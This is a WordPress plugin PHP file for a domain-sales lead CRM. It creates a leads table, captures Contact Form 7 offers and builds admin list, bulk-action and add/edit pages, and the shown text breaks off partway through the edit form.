<?php
/**
 * DB CRM Block — Domain Brothers Lead Management System
 *
 * Require_once'd from db-custom-blocks.php.
 * NOTE: PHP require_once always starts the included file in HTML mode, so a
 * <?php opening tag IS required here — the "already-open PHP context" of the
 * including file does not carry over to included files.
 *
 * Features:
 *   - Custom DB table for leads (wp_db_leads)
 *   - CF7 integration (auto-create lead on offer form submit)
 *   - Admin menu under "Domain Brothers"
 *   - Full CRUD list page with filters, bulk actions, pagination
 *   - Quick-edit AJAX modal
 *   - Add / Edit lead form
 *   - CSV export
 *   - AJAX handlers (quick edit, delete, bulk)
 *   - Dashboard widget
 *   - Enqueued admin CSS + JS (inline)
 */

defined( 'ABSPATH' ) || exit;

/* ==========================================================================
   CONSTANTS
   ========================================================================== */

if ( ! defined( 'DB_CRM_TABLE_VERSION' ) ) {
	define( 'DB_CRM_TABLE_VERSION', '1.0' );
}

/* ==========================================================================
   1. DATABASE TABLE
   ========================================================================== */

if ( ! function_exists( 'db_crm_create_table' ) ) {
	function db_crm_create_table() {
		global $wpdb;

		$stored = get_option( 'db_crm_table_version', '' );
		if ( $stored === DB_CRM_TABLE_VERSION ) {
			return; // nothing to do
		}

		$table      = $wpdb->prefix . 'db_leads';
		$charset_collate = $wpdb->get_charset_collate();

		$sql = "CREATE TABLE {$table} (
			id            INT          NOT NULL AUTO_INCREMENT,
			domain        VARCHAR(255) NOT NULL DEFAULT '',
			name          VARCHAR(255) NOT NULL DEFAULT '',
			email         VARCHAR(255) NOT NULL DEFAULT '',
			phone         VARCHAR(50)  NOT NULL DEFAULT '',
			offer_amount  DECIMAL(12,2)         DEFAULT NULL,
			message       TEXT         NOT NULL DEFAULT '',
			status        ENUM('new','contacted','negotiating','won','lost') NOT NULL DEFAULT 'new',
			source        VARCHAR(50)  NOT NULL DEFAULT 'offer_form',
			notes         TEXT         NOT NULL DEFAULT '',
			admin_notes   TEXT         NOT NULL DEFAULT '',
			created_at    DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP,
			updated_at    DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
			PRIMARY KEY (id),
			KEY idx_status (status),
			KEY idx_email  (email(20)),
			KEY idx_domain (domain(20))
		) {$charset_collate};";

		require_once ABSPATH . 'wp-admin/includes/upgrade.php';
		dbDelta( $sql );

		update_option( 'db_crm_table_version', DB_CRM_TABLE_VERSION );
	}
}
add_action( 'init', 'db_crm_create_table' );

/* ==========================================================================
   2. CREATE / VALIDATE LEAD
   ========================================================================== */

if ( ! function_exists( 'db_crm_allowed_statuses' ) ) {
	/**
	 * The single source of truth for valid `status` values — matches the
	 * ENUM('new','contacted','negotiating','won','lost') column definition.
	 * Previously inlined separately at 4 call sites; the Edit Lead save
	 * handler had no copy of this list at all, so it wrote whatever string
	 * a submitted form (or a forged request) carried straight into the
	 * ENUM column with no validation.
	 */
	function db_crm_allowed_statuses() {
		return array( 'new', 'contacted', 'negotiating', 'won', 'lost' );
	}
}

if ( ! function_exists( 'db_crm_allowed_sources' ) ) {
	function db_crm_allowed_sources() {
		return array( 'offer_form', 'direct', 'referral' );
	}
}

if ( ! function_exists( 'db_crm_clean_offer_amount' ) ) {
	/**
	 * Strips currency symbols/thousands separators before casting —
	 * floatval('$2,500') is 0.00 and floatval('2,500') is 2.00, silently
	 * corrupting every offer typed with a $ or comma. Shared so the Add/Edit
	 * Lead form and the quick-edit AJAX handler clean input exactly like the
	 * CF7 capture path does, instead of each parsing it differently.
	 *
	 * @return float|null
	 */
	function db_crm_clean_offer_amount( $raw ) {
		if ( null === $raw || '' === $raw ) {
			return null;
		}
		$clean = preg_replace( '/[^0-9.]/', '', (string) $raw );
		return is_numeric( $clean ) ? (float) $clean : null;
	}
}

if ( ! function_exists( 'db_crm_create_lead' ) ) {
	/**
	 * Insert a new lead into wp_db_leads.
	 *
	 * @param array $data  Associative array of lead fields.
	 * @return int|WP_Error  Inserted row ID on success, WP_Error on failure.
	 */
	function db_crm_create_lead( array $data ) {
		global $wpdb;

		$email = isset( $data['email'] ) ? sanitize_email( $data['email'] ) : '';
		if ( ! is_email( $email ) ) {
			return new WP_Error( 'invalid_email', __( 'A valid email address is required.', 'db-blocks' ) );
		}

		$domain = isset( $data['domain'] ) ? sanitize_text_field( $data['domain'] ) : '';
		if ( empty( $domain ) ) {
			return new WP_Error( 'missing_domain', __( 'Domain name is required.', 'db-blocks' ) );
		}

		$status = isset( $data['status'] ) && in_array( $data['status'], db_crm_allowed_statuses(), true )
			? $data['status']
			: 'new';

		$source = isset( $data['source'] ) && in_array( $data['source'], db_crm_allowed_sources(), true )
			? $data['source']
			: 'offer_form';

		$offer_amount = isset( $data['offer_amount'] ) ? db_crm_clean_offer_amount( $data['offer_amount'] ) : null;

		$insert = array(
			'domain'       => $domain,
			'name'         => sanitize_text_field( $data['name'] ?? '' ),
			'email'        => $email,
			'phone'        => sanitize_text_field( $data['phone'] ?? '' ),
			'offer_amount' => $offer_amount,
			'message'      => sanitize_textarea_field( $data['message'] ?? '' ),
			'status'       => $status,
			'source'       => $source,
			'notes'        => sanitize_textarea_field( $data['notes'] ?? '' ),
			'admin_notes'  => sanitize_textarea_field( $data['admin_notes'] ?? '' ),
		);

		$formats = array( '%s', '%s', '%s', '%s', '%f', '%s', '%s', '%s', '%s', '%s' );
		if ( $offer_amount === null ) {
			$insert['offer_amount'] = null;
			$formats[4]             = null; // will be set as NULL
		}

		// Build the query manually so NULL is handled correctly
		$table = $wpdb->prefix . 'db_leads';
		// phpcs:ignore WordPress.DB.DirectDatabaseQuery
		$result = $wpdb->insert(
			$table,
			array(
				'domain'       => $insert['domain'],
				'name'         => $insert['name'],
				'email'        => $insert['email'],
				'phone'        => $insert['phone'],
				'offer_amount' => $insert['offer_amount'],
				'message'      => $insert['message'],
				'status'       => $insert['status'],
				'source'       => $insert['source'],
				'notes'        => $insert['notes'],
				'admin_notes'  => $insert['admin_notes'],
			),
			array( '%s', '%s', '%s', '%s', $offer_amount !== null ? '%f' : null, '%s', '%s', '%s', '%s', '%s' )
		);

		if ( false === $result ) {
			return new WP_Error( 'db_error', __( 'Could not save lead to database.', 'db-blocks' ) );
		}

		return (int) $wpdb->insert_id;
	}
}

/* ==========================================================================
   3. CF7 INTEGRATION
   ========================================================================== */

add_action( 'wpcf7_mail_sent', function( $cf7 ) {
	// Only fire for forms whose title contains "offer" (case-insensitive)
	$title = strtolower( $cf7->title() );
	if ( false === strpos( $title, 'offer' ) ) {
		return;
	}

	$submission = WPCF7_Submission::get_instance();
	if ( ! $submission ) {
		return;
	}

	$posted = $submission->get_posted_data();

	// Reuse Block 6's field-name map (db-custom-blocks.php) instead of a
	// second, divergent list — two independent maps meant a field named
	// e.g. "offer-domain" would email the customer fine via Block 6 but
	// silently create no CRM lead at all, since this handler's own list
	// didn't recognize that field name.
	$domain = function_exists( 'db_offer_value' ) ? db_offer_value( $posted, 'domain' ) : ( $posted['your-domain'] ?? '' );
	if ( empty( $domain ) && isset( $_GET['d'] ) ) { // phpcs:ignore WordPress.Security.NonceVerification.Recommended
		$domain = sanitize_text_field( wp_unslash( $_GET['d'] ) );
	}

	$data = array(
		'domain'       => $domain,
		'name'         => function_exists( 'db_offer_value' ) ? db_offer_value( $posted, 'name' ) : ( $posted['your-name'] ?? '' ),
		'email'        => function_exists( 'db_offer_value' ) ? db_offer_value( $posted, 'email' ) : ( $posted['your-email'] ?? '' ),
		// Reuse Block 6's map here too, not a third ad-hoc field-name list —
		// it didn't recognize the live "Offer Contact" form's offer-phone/
		// offer-msg fields, so every real submission had a blank phone
		// number and message regardless of what the customer actually typed.
		'phone'        => function_exists( 'db_offer_value' ) ? db_offer_value( $posted, 'phone' ) : trim( (string) ( $posted['your-phone'] ?? $posted['phone'] ?? $posted['tel'] ?? '' ) ),
		'offer_amount' => function_exists( 'db_offer_value' ) ? db_offer_value( $posted, 'amount' ) : ( $posted['amount'] ?? '' ),
		'message'      => function_exists( 'db_offer_value' ) ? db_offer_value( $posted, 'message' ) : trim( (string) ( $posted['your-message'] ?? $posted['message'] ?? $posted['comments'] ?? '' ) ),
		'source'       => 'offer_form',
		'status'       => 'new',
	);

	$result = db_crm_create_lead( $data );
	if ( is_wp_error( $result ) ) {
		error_log( 'DB CRM: lead capture failed for form "' . $cf7->title() . '" — ' . $result->get_error_message() );
	}
} );

/* ==========================================================================
   4. ADMIN MENUS
   ========================================================================== */

add_action( 'admin_menu', function() {
	// Top-level "Domain Brothers" menu
	$hook_leads = add_menu_page(
		__( 'Domain Brothers', 'db-blocks' ),
		__( 'Domain Brothers', 'db-blocks' ),
		'manage_options',
		'db-crm-leads',
		'db_crm_page_leads',
		'dashicons-store',
		25
	);

	// Sub: All Leads (same callback as top-level)
	add_submenu_page(
		'db-crm-leads',
		__( 'All Leads', 'db-blocks' ),
		__( 'All Leads', 'db-blocks' ),
		'manage_options',
		'db-crm-leads',
		'db_crm_page_leads'
	);

	// Sub: Add Lead
	$hook_add_lead = add_submenu_page(
		'db-crm-leads',
		__( 'Add Lead', 'db-blocks' ),
		__( 'Add Lead', 'db-blocks' ),
		'manage_options',
		'db-crm-add-lead',
		'db_crm_page_add_lead'
	);

	// Sub: Export CSV (links to query-string handler)
	add_submenu_page(
		'db-crm-leads',
		__( 'Export CSV', 'db-blocks' ),
		__( 'Export CSV', 'db-blocks' ),
		'manage_options',
		'db-crm-export',
		'db_crm_page_export_placeholder'
	);

	// Form-processing must happen on 'load-$hook' — by the time a menu page's
	// own render callback runs, admin-header.php has already sent output, so
	// wp_safe_redirect() inside the render callback silently fails
	// ("headers already sent") and the POST just re-renders instead of
	// redirecting.
	add_action( 'load-' . $hook_leads, 'db_crm_handle_bulk_action' );
	add_action( 'load-' . $hook_add_lead, 'db_crm_handle_save_lead' );
} );

if ( ! function_exists( 'db_crm_form_errors' ) ) {
	/**
	 * Passes validation errors from the load-hook handler (which runs before
	 * any output) to the page-render callback (which runs after) within the
	 * same request.
	 */
	function db_crm_form_errors( $set = null ) {
		static $errors = array();
		if ( is_array( $set ) ) {
			$errors = $set;
		}
		return $errors;
	}
}

/* ==========================================================================
   5. HELPER — STATS
   ========================================================================== */

if ( ! function_exists( 'db_crm_get_stats' ) ) {
	function db_crm_get_stats() {
		global $wpdb;
		$table = $wpdb->prefix . 'db_leads';

		// phpcs:ignore WordPress.DB.DirectDatabaseQuery
		$rows = $wpdb->get_results(
			"SELECT status, COUNT(*) AS cnt, SUM(offer_amount) AS total_amount FROM {$table} GROUP BY status",
			ARRAY_A
		);

		$stats = array(
			'total'       => 0,
			'new'         => 0,
			'contacted'   => 0,
			'negotiating' => 0,
			'won'         => 0,
			'lost'        => 0,
			'won_value'   => 0.00,
		);

		foreach ( $rows as $row ) {
			$stats['total']           += (int) $row['cnt'];
			$stats[ $row['status'] ]   = (int) $row['cnt'];
			if ( $row['status'] === 'won' ) {
				$stats['won_value'] = (float) $row['total_amount'];
			}
		}

		return $stats;
	}
}

/* ==========================================================================
   6. HELPER — STATUS PILL HTML
   ========================================================================== */

if ( ! function_exists( 'db_crm_status_pill' ) ) {
	function db_crm_status_pill( string $status ): string {
		$labels = array(
			'new'         => 'New',
			'contacted'   => 'Contacted',
			'negotiating' => 'Negotiating',
			'won'         => 'Won',
			'lost'        => 'Lost',
		);
		$label = $labels[ $status ] ?? ucfirst( $status );
		return '<span class="db-crm-pill db-crm-pill--' . esc_attr( $status ) . '">' . esc_html( $label ) . '</span>';
	}
}

/* ==========================================================================
   7. HELPER — TIME AGO
   ========================================================================== */

if ( ! function_exists( 'db_crm_time_ago' ) ) {
	function db_crm_time_ago( string $datetime ): string {
		$diff = time() - strtotime( $datetime );
		if ( $diff < 60 )        return 'Just now';
		if ( $diff < 3600 )      return round( $diff / 60 ) . ' min ago';
		if ( $diff < 86400 )     return round( $diff / 3600 ) . ' hr ago';
		if ( $diff < 604800 )    return round( $diff / 86400 ) . ' days ago';
		if ( $diff < 2592000 )   return round( $diff / 604800 ) . ' wk ago';
		return date_i18n( 'M j, Y', strtotime( $datetime ) );
	}
}

/* ==========================================================================
   8. MAIN LEADS LIST PAGE
   ========================================================================== */

if ( ! function_exists( 'db_crm_handle_bulk_action' ) ) {
	/**
	 * Runs on load-$hook (before any output) so wp_safe_redirect() actually
	 * works — see the note at the add_action('load-...') registration above.
	 */
	function db_crm_handle_bulk_action() {
		if (
			! isset( $_POST['db_crm_bulk_nonce'] ) ||
			! wp_verify_nonce( sanitize_text_field( wp_unslash( $_POST['db_crm_bulk_nonce'] ) ), 'db_crm_bulk_action' ) ||
			! isset( $_POST['bulk_action'] ) ||
			! isset( $_POST['lead_ids'] ) ||
			! is_array( $_POST['lead_ids'] )
		) {
			return;
		}

		if ( ! current_user_can( 'manage_options' ) ) {
			wp_die( esc_html__( 'You do not have permission to do this.', 'db-blocks' ) );
		}

		global $wpdb;
		$table = $wpdb->prefix . 'db_leads';

		$allowed_statuses = db_crm_allowed_statuses();
		$new_status       = sanitize_text_field( wp_unslash( $_POST['bulk_action'] ) );
		if ( in_array( $new_status, $allowed_statuses, true ) ) {
			$ids = array_map( 'absint', $_POST['lead_ids'] );
			foreach ( $ids as $lid ) {
				// phpcs:ignore WordPress.DB.DirectDatabaseQuery
				$wpdb->update( $table, array( 'status' => $new_status ), array( 'id' => $lid ), array( '%s' ), array( '%d' ) );
			}
		}
		wp_safe_redirect( admin_url( 'admin.php?page=db-crm-leads&bulk_done=1' ) );
		exit;
	}
}

if ( ! function_exists( 'db_crm_page_leads' ) ) {
	function db_crm_page_leads() {
		global $wpdb;

		if ( ! current_user_can( 'manage_options' ) ) {
			wp_die( esc_html__( 'You do not have permission to view this page.', 'db-blocks' ) );
		}

		$table = $wpdb->prefix . 'db_leads';

		// --- Filters ---
		$filter_status = isset( $_GET['status'] ) ? sanitize_text_field( wp_unslash( $_GET['status'] ) ) : '';
		$paged         = max( 1, isset( $_GET['paged'] ) ? absint( $_GET['paged'] ) : 1 );
		$per_page      = 20;
		$offset        = ( $paged - 1 ) * $per_page;

		$where = '';
		$args  = array();
		if ( in_array( $filter_status, array( 'new', 'contacted', 'negotiating', 'won', 'lost' ), true ) ) {
			$where = $wpdb->prepare( ' WHERE status = %s', $filter_status );
		}

		// phpcs:ignore WordPress.DB.DirectDatabaseQuery,WordPress.DB.PreparedSQL.InterpolatedNotPrepared
		$total = (int) $wpdb->get_var( "SELECT COUNT(*) FROM {$table}" . $where );
		$total_pages = ceil( $total / $per_page );

		// phpcs:ignore WordPress.DB.DirectDatabaseQuery,WordPress.DB.PreparedSQL.InterpolatedNotPrepared
		$leads = $wpdb->get_results(
			$wpdb->prepare(
				"SELECT * FROM {$table}" . $where . " ORDER BY created_at DESC LIMIT %d OFFSET %d",
				$per_page,
				$offset
			),
			ARRAY_A
		);

		$stats = db_crm_get_stats();

		// Counts per-status for filter tabs
		// phpcs:ignore WordPress.DB.DirectDatabaseQuery
		$tab_counts_raw = $wpdb->get_results(
			"SELECT status, COUNT(*) AS cnt FROM {$table} GROUP BY status",
			ARRAY_A
		);
		$tab_counts = array();
		foreach ( $tab_counts_raw as $r ) {
			$tab_counts[ $r['status'] ] = (int) $r['cnt'];
		}

		$export_url = wp_nonce_url(
			admin_url( 'admin.php?page=db-crm-export&db_crm_export=1' . ( $filter_status ? '&status=' . rawurlencode( $filter_status ) : '' ) ),
			'db_crm_export'
		);

		?>
		<div class="wrap db-crm-wrap">
			<h1 class="wp-heading-inline">Domain Brothers &mdash; Leads</h1>
			<a href="<?php echo esc_url( admin_url( 'admin.php?page=db-crm-analytics' ) ); ?>" class="page-title-action">📊 Analytics</a>
			<a href="<?php echo esc_url( admin_url( 'admin.php?page=db-crm-add-lead' ) ); ?>" class="page-title-action">Add Lead</a>
			<a href="<?php echo esc_url( $export_url ); ?>" class="page-title-action">Export CSV</a>

			<?php if ( isset( $_GET['bulk_done'] ) ) : ?>
				<div class="notice notice-success is-dismissible"><p>Bulk action applied.</p></div>
			<?php endif; ?>
			<?php if ( isset( $_GET['lead_saved'] ) ) : ?>
				<div class="notice notice-success is-dismissible"><p>Lead saved successfully.</p></div>
			<?php endif; ?>
			<?php if ( isset( $_GET['lead_deleted'] ) ) : ?>
				<div class="notice notice-success is-dismissible"><p>Lead deleted.</p></div>
			<?php endif; ?>

			<!-- Stats bar -->
			<div class="db-crm-stats-bar">
				<div class="db-crm-stat">
					<span class="db-crm-stat__num"><?php echo esc_html( number_format( $stats['total'] ) ); ?></span>
					<span class="db-crm-stat__label">Total Leads</span>
				</div>
				<div class="db-crm-stat">
					<span class="db-crm-stat__num db-crm-stat__num--blue"><?php echo esc_html( number_format( $stats['new'] ) ); ?></span>
					<span class="db-crm-stat__label">New</span>
				</div>
				<div class="db-crm-stat">
					<span class="db-crm-stat__num db-crm-stat__num--green"><?php echo esc_html( number_format( $stats['won'] ) ); ?></span>
					<span class="db-crm-stat__label">Won</span>
				</div>
				<div class="db-crm-stat">
					<span class="db-crm-stat__num db-crm-stat__num--green">$<?php echo esc_html( number_format( $stats['won_value'], 2 ) ); ?></span>
					<span class="db-crm-stat__label">Deal Value</span>
				</div>
			</div>

			<!-- Filter tabs -->
			<ul class="db-crm-filter-tabs subsubsub">
				<?php
				$statuses = array(
					''            => 'All',
					'new'         => 'New',
					'contacted'   => 'Contacted',
					'negotiating' => 'Negotiating',
					'won'         => 'Won',
					'lost'        => 'Lost',
				);
				$base_url = admin_url( 'admin.php?page=db-crm-leads' );
				foreach ( $statuses as $s_key => $s_label ) {
					$count   = $s_key === '' ? $stats['total'] : ( $tab_counts[ $s_key ] ?? 0 );
					$active  = $filter_status === $s_key;
					$url     = $s_key ? add_query_arg( 'status', $s_key, $base_url ) : $base_url;
					printf(
						'<li><a href="%s" class="%s">%s <span class="count">(%d)</span></a> | </li>',
						esc_url( $url ),
						$active ? 'current' : '',
						esc_html( $s_label ),
						(int) $count
					);
				}
				?>
			</ul>

			<!-- Bulk actions form -->
			<form method="post" id="db-crm-bulk-form">
				<?php wp_nonce_field( 'db_crm_bulk_action', 'db_crm_bulk_nonce' ); ?>
				<div class="tablenav top">
					<div class="alignleft actions bulkactions">
						<select name="bulk_action" id="bulk-action-selector-top">
							<option value="-1">Bulk Actions</option>
							<option value="new">Mark as New</option>
							<option value="contacted">Mark as Contacted</option>
							<option value="negotiating">Mark as Negotiating</option>
							<option value="won">Mark as Won</option>
							<option value="lost">Mark as Lost</option>
						</select>
						<input type="submit" class="button action" value="Apply">
					</div>
					<div class="tablenav-pages">
						<span class="displaying-num"><?php echo esc_html( number_format( $total ) ); ?> items</span>
						<?php if ( $total_pages > 1 ) : ?>
							<?php for ( $p = 1; $p <= $total_pages; $p++ ) : ?>
								<a href="<?php echo esc_url( add_query_arg( 'paged', $p, $base_url . ( $filter_status ? '&status=' . rawurlencode( $filter_status ) : '' ) ) ); ?>"
								   class="<?php echo $p === $paged ? 'button button-primary' : 'button'; ?>"><?php echo esc_html( $p ); ?></a>
							<?php endfor; ?>
						<?php endif; ?>
					</div>
				</div>

				<!-- Leads table -->
				<table class="wp-list-table widefat fixed striped db-crm-table">
					<thead>
						<tr>
							<td class="manage-column column-cb check-column"><input type="checkbox" id="db-crm-check-all"></td>
							<th class="manage-column">Domain</th>
							<th class="manage-column">Contact</th>
							<th class="manage-column">Offer</th>
							<th class="manage-column">Status</th>
							<th class="manage-column">Source</th>
							<th class="manage-column">Received</th>
							<th class="manage-column">Actions</th>
						</tr>
					</thead>
					<tbody id="db-crm-tbody">
					<?php if ( empty( $leads ) ) : ?>
						<tr><td colspan="8" style="text-align:center;padding:30px;">No leads found.</td></tr>
					<?php else : ?>
						<?php foreach ( $leads as $lead ) :
							$edit_url   = admin_url( 'admin.php?page=db-crm-add-lead&lead_id=' . (int) $lead['id'] );
							$delete_url = wp_nonce_url(
								admin_url( 'admin-ajax.php?action=db_crm_delete_lead&id=' . (int) $lead['id'] ),
								'db_crm_delete_' . (int) $lead['id']
							);
						?>
						<tr data-lead-id="<?php echo esc_attr( $lead['id'] ); ?>">
							<th scope="row" class="check-column">
								<input type="checkbox" name="lead_ids[]" value="<?php echo esc_attr( $lead['id'] ); ?>">
							</th>
							<td>
								<strong><a href="<?php echo esc_url( $edit_url ); ?>"><?php echo esc_html( $lead['domain'] ); ?></a></strong>
							</td>
							<td>
								<div class="db-crm-contact-stack">
									<span><?php echo esc_html( $lead['name'] ?: '—' ); ?></span>
									<span><a href="mailto:<?php echo esc_attr( $lead['email'] ); ?>"><?php echo esc_html( $lead['email'] ); ?></a></span>
									<?php if ( $lead['phone'] ) : ?>
										<span><?php echo esc_html( $lead['phone'] ); ?></span>
									<?php endif; ?>
								</div>
							</td>
							<td>
								<?php echo $lead['offer_amount'] !== null ? esc_html( '$' . number_format( (float) $lead['offer_amount'], 2 ) ) : '&mdash;'; ?>
							</td>
							<td><?php echo db_crm_status_pill( $lead['status'] ); ?></td>
							<td><?php echo esc_html( ucfirst( str_replace( '_', ' ', $lead['source'] ) ) ); ?></td>
							<td title="<?php echo esc_attr( $lead['created_at'] ); ?>"><?php echo esc_html( db_crm_time_ago( $lead['created_at'] ) ); ?></td>
							<td class="db-crm-actions">
								<a href="#" class="db-crm-quick-edit-btn" data-id="<?php echo esc_attr( $lead['id'] ); ?>" data-status="<?php echo esc_attr( $lead['status'] ); ?>" data-admin-notes="<?php echo esc_attr( $lead['admin_notes'] ); ?>" data-offer="<?php echo esc_attr( $lead['offer_amount'] ); ?>">Edit</a>
								&nbsp;|&nbsp;
								<a href="<?php echo esc_url( wp_nonce_url( admin_url( 'admin-ajax.php?action=db_crm_delete_lead&id=' . (int) $lead['id'] ), 'db_crm_delete_' . (int) $lead['id'] ) ); ?>" class="db-crm-delete-btn" style="color:#cc0000;">Delete</a>
							</td>
						</tr>
						<!-- Quick Edit Row (hidden) -->
						<tr class="db-crm-quick-edit-row" id="db-crm-qe-row-<?php echo esc_attr( $lead['id'] ); ?>" style="display:none;">
							<td colspan="8">
								<div class="db-crm-quick-edit-panel">
									<h4>Quick Edit &mdash; <em><?php echo esc_html( $lead['domain'] ); ?></em></h4>
									<div class="db-crm-qe-fields">
										<div class="db-crm-qe-field">
											<label>Status</label>
											<select class="db-crm-qe-status">
												<?php foreach ( array( 'new', 'contacted', 'negotiating', 'won', 'lost' ) as $s ) : ?>
													<option value="<?php echo esc_attr( $s ); ?>" <?php selected( $lead['status'], $s ); ?>><?php echo esc_html( ucfirst( $s ) ); ?></option>
												<?php endforeach; ?>
											</select>
										</div>
										<div class="db-crm-qe-field">
											<label>Offer Amount ($)</label>
											<input type="number" step="0.01" min="0" class="db-crm-qe-offer" value="<?php echo esc_attr( $lead['offer_amount'] ); ?>">
										</div>
										<div class="db-crm-qe-field db-crm-qe-field--wide">
											<label>Admin Notes</label>
											<textarea class="db-crm-qe-notes" rows="3"><?php echo esc_textarea( $lead['admin_notes'] ); ?></textarea>
										</div>
									</div>
									<div class="db-crm-qe-actions">
										<button type="button" class="button button-primary db-crm-qe-save" data-id="<?php echo esc_attr( $lead['id'] ); ?>" data-nonce="<?php echo esc_attr( wp_create_nonce( 'db_crm_quick_edit_' . (int) $lead['id'] ) ); ?>">Save</button>
										<button type="button" class="button db-crm-qe-cancel">Cancel</button>
										<span class="db-crm-qe-msg"></span>
									</div>
								</div>
							</td>
						</tr>
						<?php endforeach; ?>
					<?php endif; ?>
					</tbody>
					<tfoot>
						<tr>
							<td class="manage-column column-cb check-column"><input type="checkbox"></td>
							<th class="manage-column">Domain</th>
							<th class="manage-column">Contact</th>
							<th class="manage-column">Offer</th>
							<th class="manage-column">Status</th>
							<th class="manage-column">Source</th>
							<th class="manage-column">Received</th>
							<th class="manage-column">Actions</th>
						</tr>
					</tfoot>
				</table>
			</form>
		</div><!-- .db-crm-wrap -->
		<?php
	}
}

/* ==========================================================================
   9. ADD / EDIT LEAD PAGE
   ========================================================================== */

if ( ! function_exists( 'db_crm_handle_save_lead' ) ) {
	/**
	 * Runs on load-$hook (before any output) so wp_safe_redirect() actually
	 * works on success. On validation failure it stashes the errors via
	 * db_crm_form_errors() and returns — WP then proceeds to render
	 * db_crm_page_add_lead() normally, which reads them back.
	 */
	function db_crm_handle_save_lead() {
		if ( $_SERVER['REQUEST_METHOD'] !== 'POST' || ! isset( $_POST['db_crm_lead_nonce'] ) ) {
			return;
		}
		if ( ! current_user_can( 'manage_options' ) ) {
			wp_die( esc_html__( 'You do not have permission to do this.', 'db-blocks' ) );
		}

		$errors  = array();
		$lead_id = isset( $_GET['lead_id'] ) ? absint( $_GET['lead_id'] ) : 0;

		if ( ! wp_verify_nonce( sanitize_text_field( wp_unslash( $_POST['db_crm_lead_nonce'] ) ), 'db_crm_save_lead' ) ) {
			$errors[] = 'Security check failed.';
			db_crm_form_errors( $errors );
			return;
		}

		global $wpdb;
		$table     = $wpdb->prefix . 'db_leads';
		$raw_status = sanitize_text_field( wp_unslash( $_POST['status'] ?? 'new' ) );
		$raw_source = sanitize_text_field( wp_unslash( $_POST['source'] ?? 'direct' ) );
		$post_data = array(
			'domain'       => sanitize_text_field( wp_unslash( $_POST['domain'] ?? '' ) ),
			'name'         => sanitize_text_field( wp_unslash( $_POST['name'] ?? '' ) ),
			'email'        => sanitize_email( wp_unslash( $_POST['email'] ?? '' ) ),
			'phone'        => sanitize_text_field( wp_unslash( $_POST['phone'] ?? '' ) ),
			// db_crm_clean_offer_amount(), not a bare floatval(): this save
			// path previously corrupted any offer typed with a $ or comma
			// straight to 0.00, unlike the CF7-capture path which already
			// cleaned it — same class of bug as the field-name divergence
			// fixed above, just for the currency format instead of the name.
			'offer_amount' => isset( $_POST['offer_amount'] ) ? db_crm_clean_offer_amount( wp_unslash( $_POST['offer_amount'] ) ) : null,
			'message'      => sanitize_textarea_field( wp_unslash( $_POST['message'] ?? '' ) ),
			// Whitelisted against the ENUM column, like every other write
			// path already does — this one was the sole exception, writing
			// whatever string the request carried straight into the ENUM.
			'status'       => in_array( $raw_status, db_crm_allowed_statuses(), true ) ? $raw_status : 'new',
			'source'       => in_array( $raw_source, db_crm_allowed_sources(), true ) ? $raw_source : 'direct',
			'notes'        => sanitize_textarea_field( wp_unslash( $_POST['notes'] ?? '' ) ),
			'admin_notes'  => sanitize_textarea_field( wp_unslash( $_POST['admin_notes'] ?? '' ) ),
		);

		if ( $lead_id ) {
			// phpcs:ignore WordPress.DB.DirectDatabaseQuery
			$exists = $wpdb->get_var( $wpdb->prepare( "SELECT id FROM {$table} WHERE id = %d", $lead_id ) );
			if ( ! $exists ) {
				$errors[] = __( 'Lead not found — it may have been deleted.', 'db-blocks' );
				db_crm_form_errors( $errors );
				return;
			}

			// Update
			$update_data = $post_data;
			$formats     = array( '%s', '%s', '%s', '%s', '%f', '%s', '%s', '%s', '%s', '%s' );
			if ( $update_data['offer_amount'] === null ) {
				$formats[4]                 = null;
				$update_data['offer_amount'] = null;
			}
			// phpcs:ignore WordPress.DB.DirectDatabaseQuery
			$updated = $wpdb->update( $table, $update_data, array( 'id' => $lead_id ), $formats, array( '%d' ) );
			if ( false === $updated ) {
				$errors[] = __( 'Could not save changes to the database.', 'db-blocks' );
				db_crm_form_errors( $errors );
				return;
			}
			wp_safe_redirect( admin_url( 'admin.php?page=db-crm-leads&lead_saved=1' ) );
			exit;
		}

		// Insert
		$result = db_crm_create_lead( $post_data );
		if ( is_wp_error( $result ) ) {
			$errors[] = $result->get_error_message();
			db_crm_form_errors( $errors );
			return;
		}
		wp_safe_redirect( admin_url( 'admin.php?page=db-crm-leads&lead_saved=1' ) );
		exit;
	}
}

if ( ! function_exists( 'db_crm_page_add_lead' ) ) {
	function db_crm_page_add_lead() {
		global $wpdb;

		if ( ! current_user_can( 'manage_options' ) ) {
			wp_die( esc_html__( 'You do not have permission to view this page.', 'db-blocks' ) );
		}

		$table   = $wpdb->prefix . 'db_leads';
		$lead_id = isset( $_GET['lead_id'] ) ? absint( $_GET['lead_id'] ) : 0;
		$lead    = null;
		$errors  = db_crm_form_errors();

		if ( $lead_id ) {
			// phpcs:ignore WordPress.DB.DirectDatabaseQuery
			$lead = $wpdb->get_row( $wpdb->prepare( "SELECT * FROM {$table} WHERE id = %d", $lead_id ), ARRAY_A );
			if ( ! $lead ) {
				wp_die( esc_html__( 'Lead not found.', 'db-blocks' ) );
			}
		}

		// Default values
		$defaults = array(
			'domain' => '', 'name' => '', 'email' => '', 'phone' => '',
			'offer_amount' => '', 'message' => '', 'status' => 'new',
			'source' => 'direct', 'notes' => '', 'admin_notes' => '',
		);
		$lead = $lead ? array_merge( $defaults, $lead ) : $defaults;
		// Escaped once, at output — building this with esc_html() already
		// applied and then escaping the whole string again at echo time
		// turned a domain containing "&" into a literal "&amp;amp;".
		$page_title = $lead_id ? 'Edit Lead — ' . $lead['domain'] : 'Add Lead';
		?>
		<div class="wrap db-crm-wrap">
			<h1><?php echo esc_html( $page_title ); ?></h1>
			<a href="<?php echo esc_url( admin_url( 'admin.php?page=db-crm-leads' ) ); ?>" class="page-title-action">&larr; Back to All Leads</a>

			<?php foreach ( $errors as $err ) : ?>
				<div class="notice notice-error"><p><?php echo esc_html( $err ); ?></p></div>
			<?php endforeach; ?>

			<form method="post" class="db-crm-lead-form">
				<?php wp_nonce_field( 'db_crm_save_lead', 'db_crm_lead_nonce' ); ?>

				<div class="db-crm-form-grid">
					<div class="db-crm-form-col">
						<h3>Lead Info</h3>
						<table class="form-table">
							<tr>
								<th><label for="domain">Domain *</label></th>
								<td><input type="text" id="domain" name="domain" class="regular-text" value="<?php echo esc_attr( $lead['domain'] ); ?>" required></td>
							</tr>
							<tr>
								<th><label for="name">Name</label></th>
